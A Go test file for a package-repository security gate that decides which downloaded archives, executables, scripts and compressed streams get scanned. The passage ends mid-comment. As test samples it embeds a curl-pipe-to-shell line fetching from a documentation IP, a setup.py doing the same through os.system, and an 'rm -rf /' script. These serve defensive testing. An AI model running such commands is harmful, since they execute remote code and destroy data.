package llmpkgscan

import (
	"archive/tar"
	"archive/zip"
	"bytes"
	"compress/gzip"
	"encoding/hex"
	"errors"
	"fmt"
	"io"
	"math/rand"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"testing/iotest"

	"github.com/klauspost/compress/zstd"

	"github.com/blechschmidt/pullthrough-security/internal/contentscan"
)

// What these tests pin.
//
// Whether the gate looks at a resource at all is decided from the first bytes
// of the response and from what the backend served it as. That decision is the
// gate's front door: a "no" means the bytes reach the client unexamined. The
// tests below hold the door to its documented contract (Probe.Applies):
//
//   - a payload is always examined;
//   - a package container, an executable, a script with an interpreter line or
//     a pickle is examined under every class, because a hostile repository can
//     route a package through a path that reads as an index;
//   - metadata that is expected to be an archive of data files is left alone
//     when it is exactly a tar or cpio, and only then;
//   - a compressed stream that will not show what it holds is examined:
//     "cannot tell" is never "nothing there";
//   - compressed text is told from a compressed archive by what is inside.
//
// Every input is real: built with the standard library, or read from the
// fixtures the format walkers are tested with.

// aplKind is what a sample is, in the terms of the contract.
type aplKind int

const (
	// aplDocument is content of no recognizable format: JSON, HTML, text, XML,
	// nothing at all, noise.
	aplDocument aplKind = iota
	// aplTarLike is a tar or cpio archive, under any compression.
	aplTarLike
	// aplContainer is any other container the scanner opens — zip, ar/.deb, RPM,
	// NAR — under any compression.
	aplContainer
	// aplExecutable is something a machine or an interpreter runs, under any
	// compression.
	aplExecutable
	// aplCompressedData is compressed text or data: it can be looked into, and
	// there is nothing in it to unpack or run.
	aplCompressedData
	// aplUnsupported carries the signature of an archive or compression format
	// the scanner does not open.
	aplUnsupported
	// aplUndetermined is a compressed stream that does not show what it holds.
	aplUndetermined
)

func (k aplKind) String() string {
	return [...]string{"document", "tar-like", "container", "executable", "compressed-data", "unsupported", "undetermined"}[k]
}

// aplSample is one piece of content and what it is.
type aplSample struct {
	name string
	data []byte
	kind aplKind
	// compressed reports that a compression layer wraps the content.
	compressed bool
}

// aplPackagesIndex is a Debian Packages index: the text of the gate's own
// example of a compressed index that is not a package ("Packages.gz").
const aplPackagesIndex = "Package: demo\nVersion: 1.0\nArchitecture: all\n" +
	"Filename: pool/main/d/demo/demo_1.0_all.deb\n" +
	"SHA256: 0000000000000000000000000000000000000000000000000000000000000000\n\n"

// The Packages index above as written by xz(1) and bzip2(1). The standard
// library has no encoder for either.
const (
	aplPackagesXZ = "fd377a585a000004e6d6b4460200210116000000742fe5a3e000a2005f5d0028184866dbda3085fe16e1a840dff56ca9" +
		"088a1393713c4304fe643baf1898e296444ff15294742e1d71885b320f588b0914b1966490b3ec393c6808a2108a1650" +
		"eafed32103c78d632d15e4b44007ce32759286c8b3067124b0c783a420000000e6cd508a8c0006b500017ba301000000" +
		"fcab8b2db1c467fb020000000004595a"
	aplPackagesBzip2 = "425a68393141592653590aaa67c7000013df8000104001f31421404900beefde00200050c304c0980868c9a604268233" +
		"54cd3d4d1a8d336a9a7a893f96ecb908481ebe9ed3390915527a21f031d902ac1cdd5b2ce667df25c530207da35bb07c" +
		"d8d54afdba01bfd8066c416b8b2126dd17f614878d7f8bb9229c2848055533e380"
)

func aplHex(t testing.TB, s string) []byte {
	t.Helper()
	b, err := hex.DecodeString(s)
	if err != nil {
		t.Fatalf("bad hex literal: %v", err)
	}
	return b
}

// aplFixture reads one of the format walkers' fixtures.
func aplFixture(t testing.TB, name string) []byte {
	t.Helper()
	b, err := os.ReadFile(filepath.Join("..", "contentscan", "testdata", "formats", name))
	if err != nil {
		t.Fatalf("reading fixture: %v", err)
	}
	return b
}

// aplTar builds a tar of the given name/content pairs, in order.
func aplTar(t testing.TB, members ...string) []byte {
	t.Helper()
	if len(members)%2 != 0 {
		t.Fatal("aplTar takes name/content pairs")
	}
	var buf bytes.Buffer
	tw := tar.NewWriter(&buf)
	for i := 0; i < len(members); i += 2 {
		if err := tw.WriteHeader(&tar.Header{Name: members[i], Mode: 0o644, Size: int64(len(members[i+1]))}); err != nil {
			t.Fatalf("tar header %q: %v", members[i], err)
		}
		if _, err := tw.Write([]byte(members[i+1])); err != nil {
			t.Fatal(err)
		}
	}
	if err := tw.Close(); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

// aplZip builds a zip of the given name/content pairs, in order.
func aplZip(t testing.TB, members ...string) []byte {
	t.Helper()
	if len(members)%2 != 0 {
		t.Fatal("aplZip takes name/content pairs")
	}
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	for i := 0; i < len(members); i += 2 {
		w, err := zw.Create(members[i])
		if err != nil {
			t.Fatal(err)
		}
		if _, err := w.Write([]byte(members[i+1])); err != nil {
			t.Fatal(err)
		}
	}
	if err := zw.Close(); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

func aplGzip(t testing.TB, data []byte) []byte {
	t.Helper()
	var buf bytes.Buffer
	gw := gzip.NewWriter(&buf)
	if _, err := gw.Write(data); err != nil {
		t.Fatal(err)
	}
	if err := gw.Close(); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

func aplZstd(t testing.TB, data []byte) []byte {
	t.Helper()
	enc, err := zstd.NewWriter(nil)
	if err != nil {
		t.Fatal(err)
	}
	defer enc.Close()
	return enc.EncodeAll(data, nil)
}

// aplDeb is the start of a Debian package: an ar archive whose first member is
// "debian-binary".
func aplDeb() []byte {
	return []byte("!<arch>\n" + fmt.Sprintf("%-16s%-12s%-6s%-6s%-8s%-10s`\n", "debian-binary", "0", "0", "0", "100644", "4") + "2.0\n")
}

// aplNoise returns n bytes that carry no format's signature and are not text:
// 0xa0..0xa6 repeating, which no magic the probe knows starts with.
func aplNoise(n int) []byte {
	b := make([]byte, n)
	for i := range b {
		b[i] = 0xa0 + byte(i%7)
	}
	return b
}

// aplPrefix reads from content what the gate reads to decide: ReadProbePrefix,
// exactly as Service.probe does.
func aplPrefix(t testing.TB, content []byte) []byte {
	t.Helper()
	prefix, err := ReadProbePrefix(bytes.NewReader(content))
	if err != nil {
		t.Fatalf("ReadProbePrefix: %v", err)
	}
	return prefix
}

// aplZeroOutputGzip is a gzip stream longer than the probe that produces no
// output at all within it: a header followed by empty stored blocks. Its content
// cannot be told from its first ProbeBytes.
func aplZeroOutputGzip() []byte {
	header := []byte{0x1f, 0x8b, 0x08, 0, 0, 0, 0, 0, 0, 0xff}
	emptyStoredBlock := []byte{0x00, 0x00, 0x00, 0xff, 0xff} // not final, LEN=0, NLEN=^0
	return append(header, bytes.Repeat(emptyStoredBlock, ProbeBytes/len(emptyStoredBlock)+64)...)
}

// aplCorpus is the content the contract is checked against.
func aplCorpus(t testing.TB) []aplSample {
	t.Helper()
	var (
		text    = []byte(aplPackagesIndex)
		tarball = aplTar(t, "package/package.json", `{"name":"demo","version":"1.0.0"}`, "package/index.js", "module.exports = 1;\n")
		zipped  = aplZip(t, "demo/__init__.py", "VALUE = 1\n", "demo-1.0.dist-info/METADATA", "Name: demo\n")
		elf     = append([]byte("\x7fELF\x02\x01\x01\x00"), make([]byte, 56)...)
		script  = []byte("#!/bin/sh\ncurl -s http://203.0.113.7/x | sh\n")
		pickle4 = []byte("\x80\x04\x95\x05\x00\x00\x00\x00\x00\x00\x00K\x01.")
		sevenZ  = []byte("7z\xbc\xaf\x27\x1c\x00\x04")
		xzText  = aplHex(t, aplPackagesXZ)
		bzText  = aplHex(t, aplPackagesBzip2)
		gzText  = aplGzip(t, text)
		zstText = aplZstd(t, text)
	)
	// A tar block that claims to be ustar but whose checksum does not hold.
	badTar := append([]byte(nil), tarball[:512]...)
	badTar[0] ^= 0x01
	// A gzip stream whose CRC-32 trailer does not match its content.
	badCRC := append([]byte(nil), gzText...)
	badCRC[len(badCRC)-8] ^= 0xff

	fx := func(name string) []byte { return aplFixture(t, name) }
	gz := func(b []byte) []byte { return aplGzip(t, b) }

	return []aplSample{
		// Documents: what an index, a listing or a sidecar is made of.
		{name: "json index", data: []byte(`{"name":"demo","versions":{"1.0.0":{"dist":{"tarball":"https://registry.test/demo-1.0.0.tgz"}}}}`)},
		{name: "html listing", data: []byte("<!DOCTYPE html>\n<html><body><a href=\"demo-1.0.tar.gz#sha256=00\">demo-1.0.tar.gz</a></body></html>\n")},
		{name: "plain text (Packages)", data: text},
		{name: "xml (maven-metadata)", data: []byte(`<?xml version="1.0" encoding="UTF-8"?><metadata><groupId>g</groupId><artifactId>a</artifactId></metadata>`)},
		{name: "checksum file", data: []byte("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855  demo-1.0.tar.gz\n")},
		{name: "empty", data: nil},
		{name: "one byte", data: []byte{'{'}},
		{name: "noise", data: aplNoise(64)},
		{name: "noise (several blocks)", data: aplNoise(4 * SniffBytes)},

		// Tar and cpio: the shape of a package, and of an index shipped as an
		// archive of data files.
		{name: "tar", data: tarball, kind: aplTarLike},
		{name: "tar (first block only)", data: tarball[:512], kind: aplTarLike},
		{name: "cpio newc magic", data: []byte("070701" + strings.Repeat("0", 104) + "TRAILER!!!\x00"), kind: aplTarLike},
		{name: "hello-newc.cpio", data: fx("hello-newc.cpio"), kind: aplTarLike},
		{name: "hello-crc.cpio", data: fx("hello-crc.cpio"), kind: aplTarLike},
		{name: "hello-odc.cpio", data: fx("hello-odc.cpio"), kind: aplTarLike},
		{name: "tar.gz", data: gz(tarball), kind: aplTarLike, compressed: true},
		{name: "tar.zst", data: aplZstd(t, tarball), kind: aplTarLike, compressed: true},
		{name: "hello.tar.xz", data: fx("hello.tar.xz"), kind: aplTarLike, compressed: true},
		{name: "hello.tar.zst", data: fx("hello.tar.zst"), kind: aplTarLike, compressed: true},
		{name: "hello.tar.bz2", data: fx("hello.tar.bz2"), kind: aplTarLike, compressed: true},
		{name: "hello.tar.lzma", data: fx("hello.tar.lzma"), kind: aplTarLike, compressed: true},
		{name: "hello-multistream.tar.xz", data: fx("hello-multistream.tar.xz"), kind: aplTarLike, compressed: true},
		{name: "hello-newc.cpio.gz", data: fx("hello-newc.cpio.gz"), kind: aplTarLike, compressed: true},
		{name: "tar under two layers of gzip", data: gz(gz(tarball)), kind: aplTarLike, compressed: true},
		{name: "tar under three layers of gzip", data: gz(gz(gz(tarball))), kind: aplTarLike, compressed: true},

		// Every other container the scanner opens.
		{name: "zip", data: zipped, kind: aplContainer},
		{name: "empty zip", data: []byte("PK\x05\x06" + strings.Repeat("\x00", 18)), kind: aplContainer},
		{name: "deb (ar + debian-binary)", data: aplDeb(), kind: aplContainer},
		{name: "pthello-xz.deb", data: fx("pthello-xz.deb"), kind: aplContainer},
		{name: "pthello-none.deb", data: fx("pthello-none.deb"), kind: aplContainer},
		{name: "plain.a (ar)", data: fx("plain.a"), kind: aplContainer},
		{name: "rpm lead magic", data: append([]byte{0xed, 0xab, 0xee, 0xdb, 0x03, 0x00}, make([]byte, 90)...), kind: aplContainer},
		{name: "pthello-zstd.rpm", data: fx("pthello-zstd.rpm"), kind: aplContainer},
		{name: "pthello-none.rpm", data: fx("pthello-none.rpm"), kind: aplContainer},
		{name: "hello.nar", data: fx("hello.nar"), kind: aplContainer},
		{name: "zip.gz", data: gz(zipped), kind: aplContainer, compressed: true},
		{name: "deb.gz", data: gz(aplDeb()), kind: aplContainer, compressed: true},
		{name: "rpm.zst", data: aplZstd(t, fx("pthello-none.rpm")), kind: aplContainer, compressed: true},
		{name: "hello.nar.xz", data: fx("hello.nar.xz"), kind: aplContainer, compressed: true},
		{name: "hello.nar.zst", data: fx("hello.nar.zst"), kind: aplContainer, compressed: true},
		{name: "hello.nar.bz2", data: fx("hello.nar.bz2"), kind: aplContainer, compressed: true},

		// What a machine or an interpreter runs.
		{name: "ELF", data: elf, kind: aplExecutable},
		{name: "PE (MZ)", data: append([]byte("MZ\x90\x00\x03\x00\x00\x00"), make([]byte, 56)...), kind: aplExecutable},
		{name: "Mach-O 64-bit", data: []byte{0xcf, 0xfa, 0xed, 0xfe, 0x07, 0x00, 0x00, 0x01, 0x03, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00}, kind: aplExecutable},
		{name: "Mach-O 32-bit", data: []byte{0xce, 0xfa, 0xed, 0xfe, 0x07, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00}, kind: aplExecutable},
		{name: "Mach-O 64-bit big-endian", data: []byte{0xfe, 0xed, 0xfa, 0xcf, 0x01, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x02}, kind: aplExecutable},
		{name: "Mach-O 32-bit big-endian", data: []byte{0xfe, 0xed, 0xfa, 0xce, 0x00, 0x00, 0x00, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02}, kind: aplExecutable},
		{name: "Mach-O universal", data: []byte{0xca, 0xfe, 0xba, 0xbe, 0x00, 0x00, 0x00, 0x02}, kind: aplExecutable},
		{name: "Java class", data: []byte{0xca, 0xfe, 0xba, 0xbe, 0x00, 0x00, 0x00, 0x34}, kind: aplExecutable},
		{name: "wasm", data: []byte("\x00asm\x01\x00\x00\x00"), kind: aplExecutable},
		{name: "shell script", data: script, kind: aplExecutable},
		{name: "python script", data: []byte("#!/usr/bin/env python3\nimport os\n"), kind: aplExecutable},
		{name: "pickle protocol 2", data: []byte("\x80\x02K\x01."), kind: aplExecutable},
		{name: "pickle protocol 3", data: []byte("\x80\x03K\x01."), kind: aplExecutable},
		{name: "pickle protocol 4", data: pickle4, kind: aplExecutable},
		{name: "pickle protocol 5", data: []byte("\x80\x05\x95\x05\x00\x00\x00\x00\x00\x00\x00K\x01."), kind: aplExecutable},
		{name: "ELF.gz", data: gz(elf), kind: aplExecutable, compressed: true},
		{name: "install.sh.gz", data: fx("install.sh.gz"), kind: aplExecutable, compressed: true},
		{name: "install.sh.xz", data: fx("install.sh.xz"), kind: aplExecutable, compressed: true},
		{name: "script.zst", data: aplZstd(t, script), kind: aplExecutable, compressed: true},
		{name: "pickle.gz", data: gz(pickle4), kind: aplExecutable, compressed: true},

		// Compressed text and data: an index, not a package.
		{name: "Packages.gz", data: gzText, kind: aplCompressedData, compressed: true},
		{name: "Packages.zst", data: zstText, kind: aplCompressedData, compressed: true},
		{name: "Packages.xz", data: xzText, kind: aplCompressedData, compressed: true},
		{name: "Packages.bz2", data: bzText, kind: aplCompressedData, compressed: true},
		{name: "index.json.gz", data: gz([]byte(`{"packages":{}}`)), kind: aplCompressedData, compressed: true},
		{name: "noise.gz (several blocks)", data: gz(aplNoise(4 * SniffBytes)), kind: aplCompressedData, compressed: true},
		{name: "text under two layers", data: aplZstd(t, gzText), kind: aplCompressedData, compressed: true},
		{name: "gzip of nothing", data: gz(nil), kind: aplCompressedData, compressed: true},

		// Signatures of formats the scanner does not open.
		{name: "7-zip", data: sevenZ, kind: aplUnsupported},
		{name: "rar", data: []byte("Rar!\x1a\x07\x00"), kind: aplUnsupported},
		{name: "lz4 frame", data: []byte{0x04, 0x22, 0x4d, 0x18, 0x64, 0x40, 0xa7}, kind: aplUnsupported},
		{name: "lzip", data: []byte("LZIP\x01\x0c"), kind: aplUnsupported},
		{name: "lzma-alone with a header the walker rejects", data: append([]byte{0x5d, 0x00, 0x00, 0x05, 0x00}, bytes.Repeat([]byte{0xff}, 16)...), kind: aplUnsupported},
		{name: "compress (.Z)", data: []byte{0x1f, 0x9d, 0x90}, kind: aplUnsupported},
		{name: "lzh", data: []byte{0x1f, 0xa0, 0x00}, kind: aplUnsupported},
		{name: "xar", data: []byte("xar!\x00\x1c\x00\x01"), kind: aplUnsupported},
		{name: "cabinet", data: []byte("MSCF\x00\x00\x00\x00"), kind: aplUnsupported},
		{name: "bzip2 with an invalid level", data: []byte("BZh0\x31\x41\x59\x26"), kind: aplUnsupported},
		{name: "ustar block with a bad checksum", data: badTar, kind: aplUnsupported},
		{name: "7-zip.gz", data: gz(sevenZ), kind: aplUnsupported, compressed: true},

		// Compressed streams that do not show what they hold.
		{name: "gzip cut short", data: gzText[:len(gzText)/2], kind: aplUndetermined, compressed: true},
		{name: "gzip with a bad checksum", data: badCRC, kind: aplUndetermined, compressed: true},
		{name: "gzip magic then junk", data: append([]byte{0x1f, 0x8b, 0x08, 0x00}, bytes.Repeat([]byte{0x55}, 64)...), kind: aplUndetermined, compressed: true},
		{name: "gzip magic alone", data: []byte{0x1f, 0x8b}, kind: aplUndetermined, compressed: true},
		{name: "gzip followed by garbage", data: append(append([]byte(nil), gzText...), "trailing garbage"...), kind: aplUndetermined, compressed: true},
		{name: "tar.gz cut inside its first block", data: gz(tarball)[:24], kind: aplUndetermined, compressed: true},
		{name: "zstd cut short", data: zstText[:len(zstText)/2], kind: aplUndetermined, compressed: true},
		{name: "zstd magic then junk", data: append([]byte{0x28, 0xb5, 0x2f, 0xfd}, bytes.Repeat([]byte{0x01}, 64)...), kind: aplUndetermined, compressed: true},
		{name: "zstd asking for a 2 TiB window", data: []byte{0x28, 0xb5, 0x2f, 0xfd, 0x00, 0xff, 0x01, 0x00, 0x00}, kind: aplUndetermined, compressed: true},
		{name: "xz cut short", data: xzText[:len(xzText)/2], kind: aplUndetermined, compressed: true},
		{name: "xz magic then junk", data: append([]byte{0xfd, '7', 'z', 'X', 'Z', 0x00}, bytes.Repeat([]byte{0x01}, 64)...), kind: aplUndetermined, compressed: true},
		{name: "xz with a filter the walker refuses (hello-bcj.tar.xz)", data: fx("hello-bcj.tar.xz"), kind: aplUndetermined, compressed: true},
		{name: "bzip2 cut short", data: bzText[:len(bzText)/2], kind: aplUndetermined, compressed: true},
		{name: "lzma-alone asking for a 128 MiB dictionary", data: append([]byte{0x5d, 0x00, 0x00, 0x00, 0x08, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff}, make([]byte, 32)...), kind: aplUndetermined, compressed: true},
		{name: "four layers of compression (text)", data: gz(gz(gz(gzText))), kind: aplUndetermined, compressed: true},
		{name: "four layers of compression (tar)", data: gz(gz(gz(gz(tarball)))), kind: aplUndetermined, compressed: true},
		{name: "gzip that emits nothing within the probe", data: aplZeroOutputGzip(), kind: aplUndetermined, compressed: true},
	}
}

// aplFilenames are file names a resource may be served under: some claim to be
// a package archive, some do not, one is absent.
var aplFilenames = []string{"", "index.json", "Packages.gz", "pkg-1.0.tgz", "demo-1.0-py3-none-any.whl", "demo-1.0.jar"}

func TestClassString(t *testing.T) {
	for _, tc := range []struct {
		class Class
		want  string
	}{
		{ClassUnknown, "unclassified"},
		{ClassMetadata, "metadata"},
		{ClassPayload, "payload"},
		{Class(3), "unclassified"},
		{Class(255), "unclassified"},
	} {
		if got := tc.class.String(); got != tc.want {
			t.Errorf("Class(%d).String() = %q, want %q", tc.class, got, tc.want)
		}
	}
	// The zero value is the class that makes no statement.
	var zero Class
	if zero != ClassUnknown {
		t.Errorf("the zero Class = %v, want ClassUnknown", zero)
	}
}

// The probe constants are what the readers and the callers size their buffers
// by: one tar block to recognize a format, and what PeelCompression wants to
// see through a compression layer.
func TestProbeSizes(t *testing.T) {
	if SniffBytes != 512 {
		t.Errorf("SniffBytes = %d, want one tar block (512)", SniffBytes)
	}
	if ProbeBytes != contentscan.PeelBytes {
		t.Errorf("ProbeBytes = %d, want contentscan.PeelBytes (%d)", ProbeBytes, contentscan.PeelBytes)
	}
	if ProbeBytes <= SniffBytes {
		t.Errorf("ProbeBytes (%d) must exceed SniffBytes (%d)", ProbeBytes, SniffBytes)
	}
}

// ProbeContent states what the bytes are, whatever they are called.
func TestProbeContentTellsWhatTheBytesAre(t *testing.T) {
	for _, s := range aplCorpus(t) {
		t.Run(s.name, func(t *testing.T) {
			p := ProbeContent(aplPrefix(t, s.data))

			want := Probe{Compressed: s.compressed}
			switch s.kind {
			case aplTarLike:
				want.Container, want.TarLike = true, true
			case aplContainer:
				want.Container = true
			case aplExecutable:
				want.Executable = true
			case aplUnsupported:
				want.Unsupported = true
			case aplUndetermined:
				want.Undetermined = true
			}
			got := p
			if got.Container {
				// Unsupported says nothing about a container the scanner opens (a
				// well-formed ustar block also carries the signature of "a tar block
				// whose checksum does not hold"), and Applies never asks.
				got.Unsupported = false
			}
			if got != want {
				t.Errorf("ProbeContent = %+v, want %+v (a %s)", p, want, s.kind)
			}
			if p.TarLike && !p.Container {
				t.Errorf("TarLike without Container: %+v", p)
			}
			if p.Undetermined && !p.Compressed {
				t.Errorf("only a compressed stream can be undetermined: %+v", p)
			}
		})
	}
}

// A payload is always examined; its content is not asked.
func TestApplicablePayloadAlwaysApplies(t *testing.T) {
	for _, s := range aplCorpus(t) {
		prefix := aplPrefix(t, s.data)
		if !Applicable(ClassPayload, false, prefix, "") {
			t.Errorf("%s (a %s) served as a payload: not examined", s.name, s.kind)
		}
		p := ProbeContent(prefix)
		for _, indexArchive := range []bool{false, true} {
			for _, name := range aplFilenames {
				if !p.Applies(ClassPayload, indexArchive, name) {
					t.Errorf("%s (a %s) served as a payload named %q (indexArchive=%v): not examined", s.name, s.kind, name, indexArchive)
				}
			}
		}
	}
	// Not even a nil prefix excuses a payload.
	if !Applicable(ClassPayload, false, nil, "") {
		t.Error("a payload with no content at all is not examined")
	}
}

// Metadata — an index, a listing, a sidecar — is left alone, unless its bytes
// turn out to be a package or something that runs: a repository's own index is
// what tells a client where to fetch each package from, so a hostile repository
// can route one through a path that reads as an index.
func TestApplicableMetadata(t *testing.T) {
	for _, s := range aplCorpus(t) {
		t.Run(s.name, func(t *testing.T) {
			p := ProbeContent(aplPrefix(t, s.data))

			var want, wantIndexArchive bool
			switch s.kind {
			case aplDocument, aplCompressedData:
				// JSON, HTML, text, XML, and a compressed index: nothing to examine.
			case aplUnsupported:
				// Deliberately less than an unclassified resource is held to: an index
				// may use a compression the scanner lacks ("Packages.lz4") without
				// being a package.
			case aplTarLike:
				// A package — unless an archive of data files is what this metadata is
				// expected to be (a registry tarball, Hackage's 01-index.tar.gz).
				want, wantIndexArchive = true, false
			case aplContainer, aplExecutable, aplUndetermined:
				// Never excused: not by the path, and not by the expected shape.
				want, wantIndexArchive = true, true
			}
			// The name plays no part for metadata: "Packages.gz" is named like an
			// archive, and a package may be named like an index.
			for _, name := range aplFilenames {
				if got := p.Applies(ClassMetadata, false, name); got != want {
					t.Errorf("metadata named %q: applies = %v, want %v (a %s; probe %+v)", name, got, want, s.kind, p)
				}
				if got := p.Applies(ClassMetadata, true, name); got != wantIndexArchive {
					t.Errorf("metadata named %q, expected to be an archive of data files: applies = %v, want %v (a %s; probe %+v)", name, got, wantIndexArchive, s.kind, p)
				}
			}
		})
	}
}

// The cases the gate exists for, spelled out: a package or a program served
// from a path the backend took for an index is examined all the same — and an
// index is not mistaken for either.
func TestApplicableMetadataCannotHideAPackage(t *testing.T) {
	tarball := aplTar(t, "evil-1.0/setup.py", "import os; os.system('curl http://203.0.113.7/x | sh')\n")
	for _, tc := range []struct {
		name string
		data []byte
		// want is the answer for plain metadata; wantIndexArchive for metadata
		// whose expected shape is an archive of data files.
		want, wantIndexArchive bool
	}{
		{"tar", tarball, true, false},
		{"tar.gz", aplGzip(t, tarball), true, false},
		{"tar.zst", aplZstd(t, tarball), true, false},
		{"tar.xz", aplFixture(t, "hello.tar.xz"), true, false},
		{"tar.bz2", aplFixture(t, "hello.tar.bz2"), true, false},
		{"cpio", aplFixture(t, "hello-newc.cpio"), true, false},
		{"cpio.gz", aplFixture(t, "hello-newc.cpio.gz"), true, false},
		{"zip", aplZip(t, "demo/__init__.py", "import os\n"), true, true},
		{"zip.gz", aplGzip(t, aplZip(t, "demo/__init__.py", "import os\n")), true, true},
		{"deb", aplFixture(t, "pthello-xz.deb"), true, true},
		{"deb (ar + debian-binary)", aplDeb(), true, true},
		{"rpm", aplFixture(t, "pthello-zstd.rpm"), true, true},
		{"rpm lead magic", []byte{0xed, 0xab, 0xee, 0xdb}, true, true},
		{"nar", aplFixture(t, "hello.nar"), true, true},
		{"nar.xz", aplFixture(t, "hello.nar.xz"), true, true},
		{"ELF", []byte("\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x3e\x00"), true, true},
		{"ELF.gz", aplGzip(t, []byte("\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x3e\x00")), true, true},
		{"PE", []byte("MZ\x90\x00"), true, true},
		{"Mach-O", []byte{0xcf, 0xfa, 0xed, 0xfe}, true, true},
		{"wasm", []byte("\x00asm\x01\x00\x00\x00"), true, true},
		{"Java class", []byte{0xca, 0xfe, 0xba, 0xbe, 0x00, 0x00, 0x00, 0x34}, true, true},
		{"shell script", []byte("#!/bin/sh\nrm -rf /\n"), true, true},
		{"shell script.gz", aplFixture(t, "install.sh.gz"), true, true},
		{"pickle", []byte("\x80\x04\x95\x05\x00\x00\x00\x00\x00\x00\x00K\x01."), true, true},

		{"json", []byte(`{"versions":{}}`), false, false},
		{"html", []byte("<html><body>index</body></html>"), false, false},
		{"text", []byte(aplPackagesIndex), false, false},
		{"xml", []byte(`<?xml version="1.0"?><metadata/>`), false, false},
		{"gzipped Packages index", aplGzip(t, []byte(aplPackagesIndex)), false, false},
		{"zstd Packages index", aplZstd(t, []byte(aplPackagesIndex)), false, false},
		{"xz Packages index", aplHex(t, aplPackagesXZ), false, false},
		{"bzip2 Packages index", aplHex(t, aplPackagesBzip2), false, false},
	} {
		prefix := aplPrefix(t, tc.data)
		if got := Applicable(ClassMetadata, false, prefix, "index.json"); got != tc.want {
			t.Errorf("%s served as metadata: Applicable = %v, want %v", tc.name, got, tc.want)
		}
		if got := Applicable(ClassMetadata, true, prefix, "01-index.tar.gz"); got != tc.wantIndexArchive {
			t.Errorf("%s served as metadata that is expected to be an archive: Applicable = %v, want %v", tc.name, got, tc.wantIndexArchive)
		}
	}
}

// An unclassified resource — the backend made no statement — is examined when
// its bytes are something a machine unpacks or runs, when they carry the
// signature of an archive format the scanner cannot open, or, for content of no
// recognizable format at all, when the file name claims a package archive.
func TestApplicableUnknown(t *testing.T) {
	// Which names claim a package archive is spelled out here, not asked of
	// claimsArchive: the test must not agree with the code by construction.
	claims := map[string]bool{
		"":                          false,
		"index.json":                false,
		"simple/demo/index.html":    false,
		"maven-metadata.xml":        false,
		"demo-1.0.whl.metadata":     false,
		"pkg-1.0.tgz.sig":           false,
		"Packages":                  false,
		"pkg-1.0.tgz":               true,
		"pkg-1.0.tar.gz":            true,
		"demo-1.0-py3-none-any.whl": true,
		"demo-1.0.jar":              true,
		"demo.1.0.0.nupkg":          true,
		"demo-1.0.0.crate":          true,
		"DEMO-1.0.ZIP":              true,
	}
	for _, s := range aplCorpus(t) {
		t.Run(s.name, func(t *testing.T) {
			p := ProbeContent(aplPrefix(t, s.data))
			for name, claimed := range claims {
				var want bool
				switch s.kind {
				case aplDocument:
					want = claimed
				case aplCompressedData:
					// It was looked into, and there is nothing in it to unpack or run.
					// Pinned for the names an index goes by; what a compressed
					// non-archive under a package's name should be is left to the code.
					if claimed {
						continue
					}
				case aplTarLike, aplContainer, aplExecutable, aplUnsupported, aplUndetermined:
					want = true
				}
				// What metadata is expected to look like says nothing about a resource
				// that is not metadata.
				for _, indexArchive := range []bool{false, true} {
					if got := p.Applies(ClassUnknown, indexArchive, name); got != want {
						t.Errorf("unclassified, named %q (indexArchive=%v): applies = %v, want %v (a %s; probe %+v)", name, indexArchive, got, want, s.kind, p)
					}
				}
			}
		})
	}

	// The documented example: a compressed index is named like an archive
	// without being one.
	for _, name := range []string{"Packages.gz", "Packages.xz", "Packages.bz2", "Packages.zst"} {
		if Applicable(ClassUnknown, false, aplPrefix(t, aplGzip(t, []byte(aplPackagesIndex))), name) {
			t.Errorf("a compressed text index named %q was taken for a package", name)
		}
	}
}

// "Cannot tell" is never "nothing there": a compressed stream that is corrupt,
// cut off, refused by the decoder, nested too deep, or that produces nothing
// for as long as the probe looks, is examined under every class — including
// metadata that is expected to be an archive.
func TestApplicableCannotTellIsNeverNothingThere(t *testing.T) {
	seen := 0
	for _, s := range aplCorpus(t) {
		if s.kind != aplUndetermined {
			continue
		}
		seen++
		prefix := aplPrefix(t, s.data)
		p := ProbeContent(prefix)
		if !p.Undetermined {
			t.Errorf("%s: probe = %+v, want Undetermined", s.name, p)
		}
		for _, class := range []Class{ClassUnknown, ClassMetadata, ClassPayload} {
			for _, indexArchive := range []bool{false, true} {
				if !Applicable(class, indexArchive, prefix, "index.json") {
					t.Errorf("%s served as %s (indexArchive=%v): not examined", s.name, class, indexArchive)
				}
				for _, name := range aplFilenames {
					if !p.Applies(class, indexArchive, name) {
						t.Errorf("%s served as %s named %q (indexArchive=%v): not examined", s.name, class, name, indexArchive)
					}
				}
			}
		}
	}
	if seen < 10 {
		t.Fatalf("only %d undetermined samples: the corpus lost its cases", seen)
	}

	// The rule itself, apart from any decoder: whatever else a probe says.
	for _, p := range []Probe{
		{Undetermined: true},
		{Undetermined: true, Compressed: true},
		{Undetermined: true, Compressed: true, Container: true, TarLike: true},
	} {
		for _, class := range []Class{ClassUnknown, ClassMetadata, ClassPayload} {
			for _, indexArchive := range []bool{false, true} {
				if !p.Applies(class, indexArchive, "index.json") {
					t.Errorf("%+v.Applies(%s, indexArchive=%v) = false", p, class, indexArchive)
				}
			}
		}
	}

	// NOT pinned here, because today's answer is wrong and a test must not
	// cement it (each was reported with a reproduction):
	//
	//   - Members or frames that decode to nothing and end exactly at ProbeBytes
	//     (empty gzip members, zstd skippable frames, empty xz streams), with
	//     the archive after them: the decoder sees a clean end at the end of
	//     the probe and the stream reads as "compressed, nothing in it", though
	//     the probe was full and the stream goes on.
	//   - A zip with bytes in front of it (zip readers locate the archive from
	//     its end), which shows no signature at offset 0.
	//   - A tar whose checksum field carries bytes after its terminator, which
	//     tar readers accept and the recognizer does not.
}

// Applies, as a table over what a probe can say. It is the rule on its own:
